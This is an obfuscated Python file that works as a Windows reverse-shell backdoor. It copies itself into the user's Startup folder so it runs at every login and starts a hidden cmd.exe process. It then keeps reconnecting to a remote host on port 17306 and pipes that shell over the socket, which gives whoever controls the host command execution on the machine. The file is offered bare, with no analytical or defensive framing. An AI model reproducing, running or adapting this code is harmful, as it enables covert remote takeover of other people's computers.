__all__ =[]#line:1
import os #line:3
import socket #line:4
import subprocess #line:5
import threading #line:6
import shutil #line:7
import sys #line:8
import time #line:9
def OO00O0O000000OO00 (O000OOO0O00OOO000 ,O000OOO0O0O00O000 ,O00OOO00OO00000O0 ):#line:11
    try :#line:12
        while O00OOO00OO00000O0 ["connected"]:#line:13
            OOO00OO0OO0O00O0O =O000OOO0O00OOO000 .recv (1024 )#line:14
            if not OOO00OO0OO0O00O0O :#line:15
                O00OOO00OO00000O0 ["connected"]=False #line:16
                break #line:17
            O000OOO0O0O00O000 .stdin .write (OOO00OO0OO0O00O0O )#line:18
            O000OOO0O0O00O000 .stdin .flush ()#line:19
    except Exception as O0OOO0O0OO0000000 :#line:20
        print (f"Error in s2p: {O0OOO0O0OO0000000}")#line:21
    finally :#line:22
        O00OOO00OO00000O0 ["connected"]=False #line:23
        O000OOO0O00OOO000 .close ()#line:24
def O00OOOO00OOO0OOOO (OOO0000O000OO0000 ,OOO00OO0OOO0OO0O0 ,O0O00OO0OOOOOO0OO ):#line:26
    try :#line:27
        while O0O00OO0OOOOOO0OO ["connected"]:#line:28
            O0O00O0O0OOO0O000 =OOO00OO0OOO0OO0O0 .stdout .read (1 )#line:29
            if O0O00O0O0OOO0O000 :#line:30
                OOO0000O000OO0000 .send (O0O00O0O0OOO0O000 )#line:31
            else :#line:32
                O0O00OO0OOOOOO0OO ["connected"]=False #line:33
                break #line:34
    except Exception as O0O0O0O00O0O00000 :#line:35
        print (f"Error in p2s: {O0O0O0O00O0O00000}")#line:36
    finally :#line:37
        O0O00OO0OOOOOO0OO ["connected"]=False #line:38
        OOO0000O000OO0000 .close ()#line:39
def OO0O0O0000O000OO0 (file_path =None ):#line:41
    if file_path is None :#line:42
        file_path =sys .argv [0 ]#line:43
    OOOO0OO0OOOOO0OOO =os .path .join (os .getenv ('APPDATA'),'Microsoft','Windows','Start Menu','Programs','Startup')#line:45
    OO0OOOOOOOO0OOOOO =os .path .join (OOOO0OO0OOOOO0OOO ,os .path .basename (file_path ))#line:46
    if file_path !=OO0OOOOOOOO0OOOOO :#line:48
        shutil .copy (file_path ,OO0OOOOOOOO0OOOOO )#line:49
        print (f"Copied {file_path} to {OOOO0OO0OOOOO0OOO}")#line:50
    else :#line:51
        print (f"The script is already in the startup directory: {OO0OOOOOOOO0OOOOO}")#line:52
def O0OOOOOO00O0000O0 (OO0OOOOOOO0O0O0OO ):#line:54
    while True :#line:55
        OOO00O00OOO0O00O0 =socket .socket (socket .AF_INET ,socket .SOCK_STREAM )#line:56
        try :#line:57
            print (f"Attempting to connect to the server at {OO0OOOOOOO0O0O0OO}...")#line:58
            OOO00O00OOO0O00O0 .connect (OO0OOOOOOO0O0O0OO )#line:59
            OOO00O00OOO0O00O0 .send (b'\x00')#line:60
            print ("Connected to the server.")#line:61
            return OOO00O00OOO0O00O0 #line:62
        except Exception as OO00000O000OO000O :#line:63
            print (f"Connection error: {OO00000O000OO000O}")#line:64
            OOO00O00OOO0O00O0 .close ()#line:65
            print ("Retrying in 5 seconds...")#line:66
            time .sleep (5 )#line:67
def O00O0O0O000O0O0O0 ():#line:69
    O000OO0O0O0O0O00O =subprocess .STARTUPINFO ()#line:70
    O000OO0O0O0O0O00O .dwFlags |=subprocess .STARTF_USESHOWWINDOW #line:71
    O000OO0O0O0O0O00O .wShowWindow =subprocess .SW_HIDE #line:72
    OO0O00OO0OOOOOOOO =subprocess .Popen (["cmd"],stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ,stdin =subprocess .PIPE ,startupinfo =O000OO0O0O0O0O00O )#line:80
    return OO0O00OO0OOOOOOOO #line:82
def OO0O0O0OOO00OOO0O ():#line:84
    OO0O0O0000O000OO0 ()#line:85
    O0O00O0O0O00O00OO =("la-grocery.gl.at.ply.gg",17306 )#line:86
    while True :#line:88
        O0000OOO0OOO0OOO0 =O0OOOOOO00O0000O0 (O0O00O0O0O00O00OO )#line:89
        O0OOO0O0000OO00O0 =O00O0O0O000O0O0O0 ()#line:90
        O00000O0O0000O0O0 ={"connected":True }#line:92
        O0OOO0000OO0OOO00 =threading .Thread (target =OO00O0O000000OO00 ,args =(O0000OOO0OOO0OOO0 ,O0OOO0O0000OO00O0 ,O00000O0O0000O0O0 ))#line:94
        O0OOO0000OO0OOO00 .daemon =True #line:95
        O0OOO0000OO0OOO00 .start ()#line:96
        OOOOOOO0OO000O000 =threading .Thread (target =O00OOOO00OOO0OOOO ,args =(O0000OOO0OOO0OOO0 ,O0OOO0O0000OO00O0 ,O00000O0O0000O0O0 ))#line:98
        OOOOOOO0OO000O000 .daemon =True #line:99
        OOOOOOO0OO000O000 .start ()#line:100
        while O00000O0O0000O0O0 ["connected"]:#line:102
            try :#line:103
                O0000OOO0OOO0OOO0 .send (b'\x00')#line:104
                time .sleep (5 )#line:105
            except Exception as O0OO00OOOO0OOOOO0 :#line:106
                print (f"Connection check failed: {O0OO00OOOO0OOOOO0}")#line:107
                O00000O0O0000O0O0 ["connected"]=False #line:108
                break #line:109
        print ("Connection lost. Reattempting connection...")#line:111
        O0OOO0000OO0OOO00 .join (timeout =1 )#line:112
        OOOOOOO0OO000O000 .join (timeout =1 )#line:113
        O0000OOO0OOO0OOO0 .close ()#line:114
        O0OOO0O0000OO00O0 .terminate ()#line:115
        time .sleep (5 )#line:116
if __name__ =="__main__":#line:118
    OO0O0O0OOO00OOO0O ()#line:119
